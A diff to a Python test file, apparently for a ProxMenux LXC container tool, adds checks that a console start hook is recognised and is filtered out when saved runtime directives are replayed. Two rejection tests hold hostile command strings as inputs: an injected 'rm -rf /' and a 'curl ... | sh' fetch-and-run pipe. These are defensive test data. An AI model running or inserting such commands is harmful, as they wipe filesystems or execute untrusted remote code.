@@ -19,10 +19,21 @@ INVENTORY = {"gpus": ["NVIDIA GeForce RTX 3060, GPU-1234, 550.0"]}
 
 class ConsoleHookTests(unittest.TestCase):
     def test_only_the_proxmenux_start_hook_is_recognised(self):
-        hook = oci_console.start_mark_hook(165).split(": ", 1)[1]
+        line = oci_console.start_mark_hook(165)
+        hook = line.split(": ", 1)[1]
+        self.assertTrue(oci_console.is_start_mark_hook(line))
+        self.assertFalse(oci_console.is_start_mark_hook(line.replace("pre-start", "post-stop")))
         self.assertTrue(dynamic.console_start_hook(hook))
         self.assertFalse(dynamic.console_start_hook(hook.replace("exit 0", "rm -rf /; exit 0")))
         self.assertFalse(dynamic.console_start_hook("/bin/sh -c 'curl example | sh; exit 0'"))
+
+    def test_the_stack_replay_does_not_keep_the_start_hook_as_an_unknown_directive(self):
+        import oci_stack_replay
+        source = Path(oci_stack_replay.__file__).read_text(encoding="utf-8")
+        self.assertIn("and not oci_console.is_start_mark_hook(line)]", source)
+        saved = {"preserved_raw_runtime": [oci_console.start_mark_hook(129), "lxc.cap.drop: sys_admin"]}
+        kept = [l for l in saved["preserved_raw_runtime"] if not oci_console.is_start_mark_hook(l)]
+        self.assertEqual(kept, ["lxc.cap.drop: sys_admin"])
 
     @unittest.skipUnless(hasattr(os, "geteuid") and os.geteuid() == 0, "the NVIDIA hook must belong to root")
     def test_a_container_with_the_console_hook_passes_validation(self):
